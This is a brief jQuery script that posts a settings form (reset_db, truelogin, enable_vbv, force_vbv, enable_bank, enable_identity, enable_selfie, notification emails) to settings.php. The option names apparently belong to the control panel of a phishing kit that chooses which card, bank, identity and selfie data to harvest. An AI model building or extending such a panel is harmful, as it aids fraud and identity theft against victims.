$(document).ready(function() {
    $("#setting_submit").click(function() {
        $.post("settings.php", {
            reset_db: $("#reset_db").val(),
            truelogin: $("#truelogin").val(),
            enable_suspecious: $("#enable_suspecious").val(),
            emails: $("#emails").val(),
            password: $("#password").val(),
            notification: $("#notification").val(),
            enable_vbv: $("#enable_vbv").val(),
            enable_bank: $("#enable_bank").val(),
            enable_identity: $("#enable_identity").val(),
            force_vbv: $("#force_vbv").val(),
            enable_selfie: $("#enable_selfie").val(),
            display_profile: $("#display_profile").val()
        }, function() {
            $("#content").fadeOut("1000", function() {
                $("#content").load("settings.php", null, function() {
                    $("#content").fadeIn("1000")
                })
            })
        })
    })
});
